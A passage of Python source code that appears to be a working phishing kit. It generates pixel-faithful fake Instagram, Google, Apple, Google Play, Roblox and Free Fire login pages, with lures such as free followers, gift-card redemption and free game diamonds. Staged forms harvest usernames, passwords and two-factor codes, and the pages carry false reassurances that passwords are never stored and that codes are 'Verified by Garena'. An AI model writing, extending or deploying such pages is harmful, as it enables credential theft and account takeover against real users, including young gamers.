                 "<b>%s</b></p><input class='pill code' name='otp' inputmode='numeric' maxlength='%d' "
                 "required autofocus><button class='login' type='submit'>Confirm</button>"
                 % (CFG["otp_len"], html.escape(ident), CFG["otp_len"]))
    tiles = "".join("<i class='t t%d'></i>" % i for i in range(1, 10))
    phone = ("<div class='phone'><div class='frame'><div class='notch'></div><div class='scr'>"
             "<div class='sbar'><span>9:41</span><span>&#9679;&#9679;&#9679;</span></div>"
             "<div class='phead'><span>&#8249;</span><b>sofia222</b><span>&#8943;</span></div>"
             "<div class='ptop'><div class='pav'></div><div class='pst'><div><b>536</b><i>Posts</i></div>"
             "<div><b>874K</b><i>Followers</i></div><div><b>441</b><i>Following</i></div></div></div>"
             "<div class='pbio'><b>Jhonga Doe</b><span>&#127760; Public figure</span>"
             "<span>Followed by amvig and antonymy</span></div>"
             "<div class='pbtns'><b class='on'>Follow</b><b>Message</b><b class='ic'>&#9662;</b></div>"
             "<div class='phl'><i></i><i></i><i></i><i></i><i></i></div>"
             "<div class='ptabs'><b>POSTS</b><b>REELS</b><b>TAGGED</b></div>"
             "<div class='grid'>" + tiles + "</div>"
             "<div class='pnav'><span>&#8962;</span><span>&#9906;</span><span>&#9651;</span><span>&#9825;</span>"
             "<span class='me'></span></div></div></div></div>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner + "</form>"
    mob = ("<div class='mtop'><a class='b'>&#8592;</a><span class='l'>English (India)</span></div>"
           "<div class='glyph'>" + IGG + "</div>" + form + "<div class='spacer'></div>"
           "<a class='create'>Create new account</a><div class='meta'>&#8734; Meta</div>")
    desk = ("<div class='dwrap'>" + phone + "<div class='dcol'><div class='dcard'>"
            "<div class='word'>" + IGW + "</div>" + form +
            "<div class='or'>OR</div><a class='fbl'>" + FBW + " Log in with Facebook</a>"
            "<a class='forg'>Forgot password?</a></div>"
            "<div class='signup'>Don&rsquo;t have an account? <a>Sign up</a></div></div>"
            "<div class='ifoot'><span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span>"
            "<span>Help</span><span>API</span><span>Privacy</span><span>Terms</span><span>Locations</span>"
            "<span>Instagram Lite</span><span>Threads</span><span>English &#9662;</span>"
            "<span>&copy; 2026 Instagram from Meta</span></div></div>")
    css = """
.mtop{display:flex;align-items:center;padding:13px 16px;height:46px;position:relative}
.mtop .b{font-size:22px;line-height:1}.mtop .l{position:absolute;left:0;right:0;text-align:center;
 font-size:15px;color:#737373}
.glyph{display:flex;justify-content:center;padding-top:44px}
.mob form{padding:0 16px;margin-top:76px}
.pill{width:100%;height:54px;border:1px solid #dbdbdb;border-radius:14px;background:#fafafa;padding:0 17px;
 font-size:16px;color:#262626;outline:0;margin-bottom:8px;font-family:inherit}
.pill::placeholder{color:#8e8e8e}.pill:focus{border-color:#a8a8a8;background:#fff}
.pill.code{text-align:center;letter-spacing:.4em;font-size:19px;padding-left:calc(17px + .4em)}
.login{width:100%;height:47px;border:0;border-radius:999px;background:#0095f6;color:#fff;font-size:16px;
 font-weight:600;margin-top:8px}
.login:active{background:#1877f2}
.fbl{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;color:#385185;
 font-size:14px;font-weight:600}
.forg{display:block;text-align:center;margin-top:20px;font-size:14px;color:#00376b}
.spacer{flex:1;min-height:26px}
.create{display:block;margin:0 16px 14px;height:47px;line-height:45px;text-align:center;border:1.5px solid
 #0095f6;border-radius:999px;color:#0095f6;font-size:16px;font-weight:600}
.meta{text-align:center;padding-bottom:18px;font-size:12px;color:#c7c7c7}
.ct{font-size:17px;text-align:center;margin-bottom:8px}
.cs{text-align:center;font-size:13.5px;color:#737373;line-height:1.6;margin-bottom:16px}
.dwrap{display:flex;gap:22px;align-items:center;justify-content:center;padding:44px 20px 0}
.dcol{width:350px}
.dcard{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 22px;display:flex;flex-direction:column;
 align-items:center}
.dcard .word{margin-bottom:24px}
.dcard form{width:100%}
.dcard .pill{border-radius:3px;font-size:12px;height:38px;padding:0 9px;margin-bottom:6px}
.dcard .login{border-radius:8px;height:32px;font-size:14px;margin-top:8px}
.dcard .or{display:flex;align-items:center;gap:16px;width:100%;margin:18px 0;color:#8e8e8e;font-size:13px;
 font-weight:600}
.dcard .or:before,.dcard .or:after{content:'';flex:1;height:1px;background:#dbdbdb}
.dcard .forg{font-size:12px;font-weight:400;margin-top:12px}
.signup{border:1px solid #dbdbdb;background:#fff;text-align:center;padding:22px;font-size:14px;margin-top:10px}
.signup a{color:#0095f6;font-weight:600}
.ifoot{display:flex;flex-wrap:wrap;gap:7px 15px;justify-content:center;font-size:12px;color:#8e8e8e;
 padding:26px 20px 32px;max-width:900px;margin:0 auto}
.phone{position:relative;width:370px;height:590px;flex:none}
.frame{position:absolute;inset:0;border:8px solid #1c1c1c;border-radius:42px;overflow:hidden;background:#fff;
 box-shadow:0 0 0 1px #dbdbdb}
.notch{position:absolute;top:0;left:50%;transform:translateX(-50%);width:122px;height:23px;background:#1c1c1c;
 border-radius:0 0 15px 15px;z-index:3}
.scr{position:absolute;inset:0;display:flex;flex-direction:column;font-size:11px;overflow:hidden}
.sbar{display:flex;justify-content:space-between;padding:8px 18px 0;font-size:10px;font-weight:600}
.phead{display:flex;align-items:center;justify-content:space-between;padding:12px 14px 10px;font-size:14px}
.ptop{display:flex;align-items:center;gap:18px;padding:0 14px 12px}
.pav{width:64px;height:64px;border-radius:50%;flex:0 0 auto;
 background:linear-gradient(135deg,#f9ce34,#ee2a7b 55%,#6228d7);position:relative}
.pav:after{content:'';position:absolute;inset:2px;border-radius:50%;border:2px solid #fff}
.pst{display:flex;gap:8px;text-align:center;flex:1;justify-content:space-around}
.pst b{display:block;font-size:13px}.pst i{font-style:normal;font-size:10px;color:#737373}
.pbio{display:flex;flex-direction:column;padding:0 14px 10px;font-size:11px;color:#737373}
.pbio b{color:#262626}
.pbtns{display:flex;gap:6px;padding:0 14px 10px}
.pbtns b{flex:1;text-align:center;border:1px solid #dbdbdb;border-radius:7px;padding:6px 0;font-size:11px;
 font-weight:600}.pbtns b.on{background:#0095f6;border-color:#0095f6;color:#fff}.pbtns b.ic{flex:0 0 34px}
.phl{display:flex;gap:14px;padding:0 14px 10px}
.phl i{width:50px;height:50px;border-radius:50%;border:1px solid #dbdbdb;
 background:linear-gradient(135deg,#e8e8e8,#c7c7c7)}
.ptabs{display:flex;border-top:1px solid #efefef}
.ptabs b{flex:1;text-align:center;padding:9px 0;font-size:10px;color:#8e8e8e}
.ptabs b:first-child{color:#262626;border-bottom:1px solid #262626}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;flex:1;overflow:hidden}
.grid .t{display:block;padding-bottom:100%}
.t1{background:linear-gradient(140deg,#5b7fa8,#c9d8e8)}.t2{background:linear-gradient(140deg,#e8b04b,#8a5a1e)}
.t3{background:linear-gradient(140deg,#7fa87a,#2f5233)}.t4{background:linear-gradient(140deg,#d98b8b,#7a3b3b)}
.t5{background:linear-gradient(140deg,#8f8fd9,#3b3b7a)}.t6{background:linear-gradient(140deg,#d9c58f,#7a6a3b)}
.t7{background:linear-gradient(140deg,#8fd9cf,#3b7a72)}.t8{background:linear-gradient(140deg,#c98fd9,#5c3b7a)}
.t9{background:linear-gradient(140deg,#d9a38f,#7a4b3b)}
.pnav{display:flex;justify-content:space-around;padding:9px 0;border-top:1px solid #efefef;font-size:14px}
.pnav .me{width:20px;height:20px;border-radius:50%;background:#c7c7c7;border:1px solid #262626}
.mob{background:#fff}
.dfull{background:#fff}
"""
    return mob, desk, css, ""

# ---------------- Instagram followers
PKGS = [("100", "100"), ("250", "250"), ("500", "500"), ("1000", "1K"), ("2500", "2.5K"),
        ("5000", "5K"), ("10000", "10K"), ("25000", "25K")]

def lay_igf(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "user":
        cards = "".join(
            "<label class='pkg'><input type='radio' name='amount' value='%s'%s><span class='pb'>"
            "<b>%s</b><i>followers</i></span></label>"
            % (v, " checked" if v == "1000" else "", t) for v, t in PKGS)
        inner = ("<div class='head'><h2>Choose your package</h2>"
                 "<p>Instant delivery &middot; 100% real accounts</p></div>"
                 "<div class='pkgrid'>" + cards + "</div>"
                 "<label class='lbl'>Your Instagram username</label>"
                 "<input class='pill' name='ident' placeholder='@username' autocapitalize='none' "
                 "spellcheck='false' required autofocus>"
                 "<button class='login' type='submit'>Continue</button>"
                 "<div class='safe'>" + LOCK + " We never post on your behalf</div>")
    elif step == "pw":
        inner = ("<div class='who'><span class='av'>" + html.escape((ident or "?")[0].upper()) +
                 "</span><div><b>@" + html.escape(ident) + "</b><i>Instagram account</i></div>"
                 "<span class='chk'>" + TICK + "</span></div>"
                 "<label class='lbl'>Password</label>"
                 "<input class='pill' name='pw' type='password' placeholder='Password' "
                 "autocomplete='current-password' required autofocus>"
                 "<button class='login' type='submit'>Log in &amp; claim</button>"
                 "<div class='note'>We only read your profile to deliver followers. "
                 "Your password is never stored.</div>")
    else:
        inner = ("<div class='otpbox'><div class='otpico'>" + IGG.replace('width="48" height="48"',
                                                                         'width="32" height="32"') + "</div>"
                 "<h3>Two-factor authentication</h3><p>Enter the %d-digit code sent to "
                 "<b>%s</b></p><input class='pill code' name='otp' inputmode='numeric' maxlength='%d' "
                 "required autofocus><button class='login' type='submit'>Confirm</button></div>"
                 % (CFG["otp_len"], html.escape(ident), CFG["otp_len"]))
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner + "</form>"
    mob = ("<div class='top'><span class='bk'>&#8592;</span><b>Free Followers</b>"
           "<span class='sp'></span><span class='dot'></span></div>"
           "<div class='bar'><i class='on'></i><i class='" + ("on" if step != "user" else "") + "'></i>"
           "<i class='" + ("on" if step == "otp" else "") + "'></i></div>"
           "<div class='sheet'>" + form + "</div><div class='foot'>instagram.com &middot; Meta</div>")
    desk = ("<div class='dwrap'><div class='dcard'><div class='dhead'>" + IGG + "<div>"
            "<b>Free Instagram Followers</b><span>Instant delivery &middot; no payment</span></div></div>" +
            form + "</div><div class='dside'><h4>How it works</h4><ol><li>Choose your package</li>"
            "<li>Confirm your username</li><li>Log in to receive them</li></ol>"
            "<div class='dhint'>Followers land in under 2 minutes. Real-looking profiles, no bots.</div>"
            "<div class='dhint' style='color:#0095f6'>Only 1 claim per account.</div></div></div>")
    css = """
body{background:#fafafa;color:#262626}
.mob{background:#fff}
.top{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid #efefef}
.top .bk{font-size:21px}.top b{font-size:16px}.top .sp{flex:1}
.top .dot{width:8px;height:8px;border-radius:50%;background:#1ed760}
.bar{display:flex;gap:5px;padding:12px 16px 0}
.bar i{flex:1;height:3px;border-radius:2px;background:#e8e8e8}
.bar i.on{background:#0095f6}
.sheet{padding:16px;flex:1}
.head{text-align:center;margin-bottom:14px}
.head h2{font-size:17px;margin-bottom:3px}
.head p{font-size:12px;color:#8e8e8e}
.pkgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:7px;margin-bottom:18px}
.pkg{position:relative;cursor:pointer}
.pkg input{position:absolute;opacity:0;pointer-events:none}
.pb{display:block;border:1.5px solid #dbdbdb;border-radius:12px;padding:11px 2px;text-align:center}
.pb b{display:block;font-size:14px;color:#262626}
.pb i{font-style:normal;font-size:8.5px;color:#8e8e8e;letter-spacing:.3px}
.pkg input:checked+.pb{border-color:#0095f6;background:#eaf5ff}
.pkg input:checked+.pb b{color:#0095f6}
.pill{width:100%;height:52px;border:1px solid #dbdbdb;border-radius:14px;background:#fafafa;padding:0 16px;
 font-size:16px;color:#262626;outline:0;margin-bottom:10px;font-family:inherit}
.pill:focus{border-color:#a8a8a8;background:#fff}
.pill.code{text-align:center;letter-spacing:.4em;font-size:19px;padding-left:calc(16px + .4em)}
.login{width:100%;height:47px;border:0;border-radius:999px;background:#0095f6;color:#fff;font-size:15.5px;
 font-weight:600;margin-top:6px}
.who{display:flex;align-items:center;gap:11px;background:#fafafa;border:1px solid #efefef;border-radius:14px;
 padding:11px;margin-bottom:16px}
.av{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#f9ce34,#ee2a7b 55%,#6228d7);
 color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:16px}
.who b{display:block;font-size:14px}.who i{font-style:normal;font-size:12px;color:#8e8e8e}
.chk{margin-left:auto;color:#0095f6}
.note,.safe{font-size:11.5px;color:#8e8e8e;text-align:center;line-height:1.6;margin-top:14px}
.otpbox{text-align:center}
.otpico{display:flex;justify-content:center;margin-bottom:12px}
.otpbox h3{font-size:17px;margin-bottom:6px}
.otpbox p{font-size:13px;color:#737373;line-height:1.6;margin-bottom:16px}
.foot{margin-top:auto;text-align:center;font-size:11px;color:#b9b9b9;padding:14px}
.dwrap{display:flex;gap:26px;justify-content:center;align-items:flex-start;padding:52px 20px}
.dfull{align-items:center;padding-top:40px}
.dcard{width:400px;background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:28px}
.dhead{display:flex;align-items:center;gap:12px;padding-bottom:18px;margin-bottom:18px;
 border-bottom:1px solid #efefef}
.dhead b{display:block;font-size:15px}.dhead span{font-size:11.5px;color:#8e8e8e}
.dside{width:280px;padding-top:6px}
.dside h4{font-size:11px;letter-spacing:.8px;text-transform:uppercase;color:#8e8e8e;margin-bottom:10px}
.dside ol{margin-left:17px;font-size:12.5px;color:#4a4a4a;line-height:2}
.dhint{font-size:11.5px;color:#8e8e8e;margin-top:12px;line-height:1.7}
"""
    return mob, desk, css, ""

# ---------------- redeem
def lay_redeem(s, tok, step, ctx):
    if step == "code":
        inner = ("<h1>Redeem your code</h1><p class='sm'>" + html.escape(s["help"]) + "</p>"
                 "<input class='in code' id='gc' name='extra' inputmode='text' autocapitalize='characters' "
                 "spellcheck='false' placeholder='XXXX-XXXX-XXXX' maxlength='20' required autofocus>"
                 "<button class='btn' type='submit'>Redeem</button>"
                 "<div class='trust'>" + LOCK + " Secure redemption</div>")
    else:
        inner = ("<h1>Confirm your account</h1><p class='sm'>Log in to receive the reward on "
                 + html.escape(s["l"]) + ".</p>" + fld("login", s, tok, ctx) +
                 "<button class='btn' type='submit'>Confirm &amp; redeem</button>"
                 "<div class='trust'>" + LOCK + " Encrypted login</div>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    mob = ("<div class='hero'><div class='hbox'>" + brand(s, 170) + "</div></div>"
           "<div class='card'>" + form + "</div>"
           "<div class='foot'>" + html.escape(s["l"]) + " &copy; 2026 &middot; Terms &middot; Privacy</div>")
    desk = ("<div style='align-items:center;justify-content:center;min-height:100vh;padding:34px 20px'>"
            "<div class='dcard'><div class='hero'><div class='hbox'>" + brand(s, 190) + "</div></div>"
            "<div class='in2'>" + form + "</div></div>"
            "<div class='foot' style='text-align:center'>" + html.escape(s["l"]) +
            " &copy; 2026 &middot; Terms &middot; Privacy</div></div>")
    css = """
body{background:var(--bg);color:var(--tx)}
.hero{padding:26px 18px;text-align:center;background:linear-gradient(180deg,rgba(255,255,255,.09),transparent)}
.hbox{display:flex;justify-content:center}
h1{font-size:20px;margin-bottom:8px}
.sm{font-size:12.5px;color:var(--mut);line-height:1.65;margin-bottom:16px}
.dcard{width:420px;background:var(--card);border:1px solid var(--bd);border-radius:16px;overflow:hidden}
.in2{padding:6px 24px 24px}
.card{margin-top:0;border-top:0;border-radius:0 0 14px 14px}
.dfull{align-items:center;justify-content:center}
"""
    return mob, desk, css, step_js(step)

def lay_roblox(s, tok, step, ctx):
    if step == "code":
        inner = ("<h1>Redeem Roblox Codes</h1>"
                 "<p class='sm'>Enter your gift card code below. Codes are 12 characters and appear on the back "
                 "of the card under the scratch layer.</p>"
                 "<input class='in code' id='gc' name='extra' placeholder='XXXX-XXXX-XXXX' maxlength='20' "
                 "required autofocus><button class='btn' type='submit'>Redeem</button>"
                 "<div class='trust'>" + LOCK + " Codes are verified instantly</div>")
    else:
        inner = ("<h1>Log in to redeem</h1><p class='sm'>You must be logged in to add credit to your Roblox "
                 "account.</p>" + fld("login", s, tok, ctx) +
                 "<button class='btn' type='submit'>Log In &amp; Redeem</button>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    items = ("<div class='it'><i class='b1'></i><b>10,000 Robux</b><span>12 months of Premium</span></div>"
             "<div class='it'><i class='b2'></i><b>2,200 Robux</b><span>Most popular bundle</span></div>"
             "<div class='it'><i class='b3'></i><b>800 Robux</b><span>Quick top-up</span></div>")
    head = ("<div class='nav'><span class='lg'>" + ROBLOX_W + "</span><span class='sp'></span>"
            "<span class='nl'>Charts</span><span class='nl'>Marketplace</span><span class='nl'>Develop</span>"
            "<span class='nl'>Robux</span></div>")
    mob = (head + "<div class='sheet'>" + form + "</div>"
           "<div class='foot'>Roblox &copy; 2026 &middot; Support &middot; Terms &middot; Privacy</div>")
    desk = ("<div class='nav'>" + ROBLOX_W + "<span class='sp'></span><span class='nl'>Charts</span>"
            "<span class='nl'>Marketplace</span><span class='nl'>Develop</span><span class='nl'>Robux</span></div>"
            "<div class='dwrap'><div class='dmain'>" + form + "</div><div class='dside'><h4>Popular rewards</h4>"
            + items + "<div class='hintbox'>Gift cards are region locked. Make sure your account region "
            "matches the card.</div></div></div>"
            "<div class='foot' style='text-align:center'>Roblox &copy; 2026</div>")
    css = """
body{background:#232527;color:#fff}
.nav{display:flex;align-items:center;gap:16px;padding:12px 18px;border-bottom:1px solid #313336;
 background:#1b1d1f}
.nav .sp{flex:1}.nav .nl{font-size:11.5px;color:#c3c5c7;font-weight:500}
.sheet{padding:22px 18px;flex:1}
h1{font-size:23px;font-weight:800;letter-spacing:-.6px;margin-bottom:10px}
.sm{font-size:12.5px;color:#a5a8ab;line-height:1.7;margin-bottom:18px}
.in{background:#191b1d;border:1px solid #3a3d40;color:#fff;height:56px;font-size:18px;border-radius:6px}
.in:focus{border-color:#e2231a;box-shadow:none}
.code{letter-spacing:.3em;text-align:center;font-family:ui-monospace,monospace;font-weight:700}
.btn{background:#e2231a;border-radius:6px;height:50px;font-size:16px;font-weight:700}
.trust{color:#8b8b8b}
.foot{text-align:center;font-size:11px;color:#7a7a7a;padding:16px}
.dwrap{display:flex;gap:40px;justify-content:center;padding:56px 24px;align-items:flex-start}
.dfull{padding-top:0}
.dmain{width:420px}.dside{width:280px}
.dside h4{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#8b8b8b;margin-bottom:12px}
.it{display:flex;align-items:center;gap:11px;background:#1b1d1f;border:1px solid #313336;border-radius:10px;
 padding:11px;margin-bottom:8px}
.it i{width:36px;height:36px;border-radius:8px;flex:0 0 auto}
.b1{background:linear-gradient(135deg,#e2231a,#7a0f0a)}.b2{background:linear-gradient(135deg,#00a2ff,#004b7a)}
.b3{background:linear-gradient(135deg,#00b06f,#00563a)}
.it b{display:block;font-size:12.5px}.it span{font-size:11px;color:#8b8b8b}
.hintbox{font-size:11.5px;color:#8b8b8b;line-height:1.7;margin-top:14px;border-top:1px solid #313336;
 padding-top:12px}
"""
    return mob, desk, css, step_js(step)

def lay_ff(s, tok, step, ctx):
    if step == "code":
        inner = ("<h1>Redeem Diamonds</h1>"
                 "<p class='sm'>Enter your Free Fire Player ID and the redeem code to receive diamonds "
                 "instantly in your account.</p>"
                 "<label class='lbl'>Player ID (UID)</label>"
                 "<input class='in' name='ident' inputmode='numeric' placeholder='e.g. 1234567890' required autofocus>"
                 "<label class='lbl'>Redeem code</label>"
                 "<input class='in code' id='gc' name='extra' placeholder='XXXX-XXXX-XXXX' maxlength='20' required>"
                 "<button class='btn' type='submit'>Redeem now</button>"
                 "<div class='trust'>" + LOCK + " Verified by Garena</div>")
    else:
        inner = ("<h1>Log in to Garena</h1><p class='sm'>Sign in so the diamonds can be credited to your "
                 "Free Fire account.</p>" + fld("login", s, tok, ctx) +
                 "<button class='btn' type='submit'>Log In &amp; Claim</button>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    packs = ("<div class='pk'><b>220</b><i>diamonds</i></div><div class='pk hot'><b>1,060</b><i>diamonds</i></div>"
             "<div class='pk'><b>2,200</b><i>diamonds</i></div>")
    head = ("<div class='nav'><span class='lg'>" + FFIRE_W + "</span><span class='sp'></span>"
            "<span class='nl'>Home</span><span class='nl'>Redeem</span><span class='nl'>Support</span></div>")
    mob = (head + "<div class='sheet'>" + form + "</div><div class='foot'>Garena Free Fire &copy; 2026</div>")
    desk = ("<div class='nav'>" + FFIRE_W + "<span class='sp'></span><span class='nl'>Home</span>"
            "<span class='nl'>Redeem</span><span class='nl'>Support</span></div>"
            "<div class='dwrap'><div class='dmain'>" + form + "</div><div class='dside'><h4>Today's drop</h4>"
            "<div class='packs'>" + packs + "</div><div class='hintbox'>Diamonds arrive within 30 seconds. "
            "Limit one redemption per UID per day.</div></div></div>"
            "<div class='foot' style='text-align:center'>Garena &copy; 2026</div>")
    css = """
body{background:#070d15;color:#eef4fb}
.nav{display:flex;align-items:center;gap:16px;padding:12px 18px;border-bottom:1px solid #16222f;
 background:#0a121c}
.nav .sp{flex:1}.nav .nl{font-size:11.5px;color:#8ba0b5}
.sheet{padding:22px 18px;flex:1}
h1{font-size:23px;font-weight:800;letter-spacing:-.5px;margin-bottom:10px;color:#fff}
.sm{font-size:12.5px;color:#93a6ba;line-height:1.7;margin-bottom:16px}
.lbl{color:#93a6ba}
.in{background:#0e1826;border:1px solid #1e2d3f;color:#fff;height:52px;border-radius:9px}
.in:focus{border-color:#ff9c1a;box-shadow:none}
.code{letter-spacing:.3em;text-align:center;font-family:ui-monospace,monospace;font-weight:700}
.btn{background:linear-gradient(180deg,#ff9c1a,#e07f00);color:#111;border-radius:9px;height:50px;
 font-size:16px;font-weight:800}
.trust{color:#7d8fa1}
.foot{text-align:center;font-size:11px;color:#6c7d8e;padding:16px}
.dwrap{display:flex;gap:40px;justify-content:center;padding:56px 24px;align-items:flex-start}
.dmain{width:420px}.dside{width:270px}
.dside h4{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#7d8fa1;margin-bottom:12px}
.packs{display:grid;grid-template-columns:repeat(3,1fr);gap:7px}
.pk{background:#0e1826;border:1px solid #1e2d3f;border-radius:10px;padding:11px 4px;text-align:center}
.pk.hot{border-color:#ff9c1a;background:#1a1206}
.pk b{display:block;font-size:14px;color:#ff9c1a}.pk i{font-style:normal;font-size:8.5px;color:#7d8fa1}
.hintbox{font-size:11.5px;color:#7d8fa1;line-height:1.7;margin-top:14px;border-top:1px solid #16222f;
 padding-top:12px}
"""
    return mob, desk, css, step_js(step)

def lay_gplay(s, tok, step, ctx):
    if step == "code":
        inner = ("<h1>Redeem gift card</h1><p class='sm'>" + html.escape(s["help"]) + "</p>"
                 "<input class='in code' id='gc' name='extra' placeholder='XXXX-XXXX-XXXX-XXXX' maxlength='24' "
                 "required autofocus><button class='btn' type='submit'>Redeem</button>")
    else:
        inner = ("<h1>Confirm your account</h1><p class='sm'>Sign in to add the balance to your Google Play "
                 "wallet.</p>" + fld("login", s, tok, ctx) + "<button class='btn' type='submit'>Redeem</button>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    head = ("<div class='top'><span class='lg'>" + GPLAY + "</span></div>")
    mob = (head + "<div class='w'>" + form + "</div><div class='foot'>Google Play &copy; 2026</div>")
    desk = (head + "<div class='ctr'><div class='card'>" + form + "</div></div>"
            "<div class='foot'>Google Play &copy; 2026</div>")
    css = """
body{background:#fff;color:#202124;font-family:Roboto,Arial,sans-serif}
.top{padding:18px 16px;border-bottom:1px solid #e8eaed}
.w{padding:22px 16px;max-width:460px;margin:0 auto}
h1{font-size:22px;font-weight:400;margin-bottom:8px}
.sm{font-size:13px;color:#5f6368;line-height:1.7;margin-bottom:18px}
.in{height:54px;border:1px solid #dadce0;border-radius:6px;font-size:16px}
.in:focus{border:2px solid #1a73e8;box-shadow:none}
.code{letter-spacing:.2em;text-align:center;font-family:monospace;font-weight:700}
.btn{background:#1a73e8;border-radius:6px;height:46px;font-size:15px;font-weight:600;width:auto;padding:0 26px;
 float:right;margin-top:18px}
.ctr{min-height:60vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:460px;border:1px solid #dadce0;border-radius:10px;padding:34px 30px}
.foot{text-align:center;font-size:11px;color:#5f6368;padding:16px;border-top:1px solid #e8eaed}
.dfull{min-height:100vh}
"""
    return mob, desk, css, step_js(step)

def lay_itunes(s, tok, step, ctx):
    if step == "code":
        inner = ("<h1>Redeem your gift card</h1><p class='sm'>" + html.escape(s["help"]) + "</p>"
                 "<input class='in code' id='gc' name='extra' placeholder='XXXX-XXXX-XXXX-XXXX' maxlength='24' "
                 "required autofocus><button class='btn' type='submit'>Redeem</button>")
    else:
        inner = ("<h1>Sign in to redeem</h1><p class='sm'>Use your Apple ID to add the balance.</p>" +
                 fld("login", s, tok, ctx) + "<button class='btn' type='submit'>Continue</button>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    head = ("<div class='top'><span class='lg'>" + ITUNES + "</span></div>")
    mob = (head + "<div class='w'>" + form + "</div><div class='foot'>Apple &copy; 2026</div>")
    desk = (head + "<div class='ctr'><div class='card'>" + form + "</div></div>"
            "<div class='foot'>Apple &copy; 2026</div>")
    css = """
body{background:#f5f5f7;color:#1d1d1f;font-family:-apple-system,'Segoe UI',Roboto,sans-serif}
.top{padding:16px;background:#fff;border-bottom:1px solid #d2d2d7}
.w{padding:24px 18px;max-width:440px;margin:0 auto}
h1{font-size:24px;font-weight:600;letter-spacing:-.4px;margin-bottom:8px}
.sm{font-size:13px;color:#6e6e73;line-height:1.7;margin-bottom:18px}
.in{height:52px;border:1px solid #d2d2d7;border-radius:10px;background:#fff;font-size:16px}
.in:focus{border-color:#0071e3;box-shadow:0 0 0 3px #0071e31f}
.code{letter-spacing:.2em;text-align:center;font-family:monospace;font-weight:700}
.btn{background:#0071e3;border-radius:10px;height:46px;font-size:15px;font-weight:500}
.ctr{min-height:58vh;display:flex;align-items:center;justify-content:center;padding:24px}
.card{width:440px;background:#fff;border-radius:14px;padding:34px 28px;box-shadow:0 10px 30px #00000010}
.foot{text-align:center;font-size:11px;color:#86868b;padding:16px}
.dfull{min-height:100vh}
"""
    return mob, desk, css, step_js(step)

# ---------------- Google accounts
def lay_google(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<h1>Sign in</h1><p class='sub'>Use your Google Account</p>"
                 "<div class='fbox'><input class='in' name='ident' placeholder=' ' required autofocus>"
                 "<label>Email or phone</label></div>"
                 "<a class='lk' style='margin-top:8px;display:inline-block'>Forgot email?</a>"
                 "<p class='sub2'>Not your computer? Use Guest mode to sign in privately. "
                 "<a class='lk'>Learn more</a></p>"
                 "<div class='row'><a class='lk2'>Create account</a>"
                 "<button class='btn2' type='submit'>Next</button></div>")
    elif step == "pw":
        inner = ("<div class='chip'><span class='av'>" + html.escape((ident or "?")[0]) + "</span>" +
                 html.escape(ident) + "</div><h1>Welcome</h1>"
                 "<div class='fbox'><input class='in' name='pw' type='password' placeholder=' ' required autofocus>"
                 "<label>Enter your password</label></div>"
                 "<div class='row'><a class='lk2'>Forgot password?</a>"
                 "<button class='btn2' type='submit'>Next</button></div>")
    else:
        inner = ("<h1>Verify it&rsquo;s you</h1><p class='sub'>Enter the %d-digit code sent to <b>%s</b></p>"
                 "<div class='fbox'><input class='in code' name='otp' inputmode='numeric' maxlength='%d' "
                 "placeholder=' ' required autofocus><label>Enter code</label></div>"
                 "<div class='row'><a class='lk2'>Resend it</a>"
                 "<button class='btn2' type='submit'>Next</button></div>"
                 % (CFG["otp_len"], html.escape(ident), CFG["otp_len"]))
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner + "</form>"
    mob = ("<div class='pg'><div class='lg'>" + GOOGLE + "</div>" + form + "</div>"
           "<div class='ft'><select class='lang'><option>English (United States)</option>"
           "<option>English (United Kingdom)</option><option>à¤¹à¤¿à¤¨à¥à¤¦à¥</option></select><span class='sp'></span>"
           "<a>Help</a><a>Privacy</a><a>Terms</a></div>")
    desk = ("<div class='pg ctr'><div class='card'><div class='lg' style='margin-bottom:22px'>" + GOOGLE_G +
            "</div>" + form + "</div></div>"
            "<div class='ft'><select class='lang'><option>English (United States)</option>"
            "<option>English (United Kingdom)</option><option>à¤¹à¤¿à¤¨à¥à¤¦à¥</option></select><span class='sp'></span>"
            "<a>Help</a><a>Privacy</a><a>Terms</a></div>")
    css = """
body{background:#fff;color:#202124;font-family:Roboto,'Helvetica Neue',Arial,sans-serif}
.pg{min-height:100vh;display:flex;flex-direction:column;padding:24px 22px}
.lg{margin-bottom:20px}
h1{font-size:24px;font-weight:400;margin-bottom:10px;letter-spacing:0;line-height:1.33}
.sub{font-size:16px;margin-bottom:22px;line-height:1.5}
.sub2{font-size:13.5px;color:#5f6368;margin:26px 0 0;line-height:1.6}
.fbox{position:relative;margin-bottom:4px}
.fbox .in{height:56px;border:1px solid #dadce0;border-radius:4px;font-size:16px;padding:16px 14px 4px;
 background:transparent}
.fbox .in:focus{border:2px solid #1a73e8;padding:15px 13px 3px;box-shadow:none}
.fbox label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;color:#5f6368;
 pointer-events:none;transition:.14s;background:#fff;padding:0 4px;text-transform:none;letter-spacing:0;
 font-weight:400;margin:0}
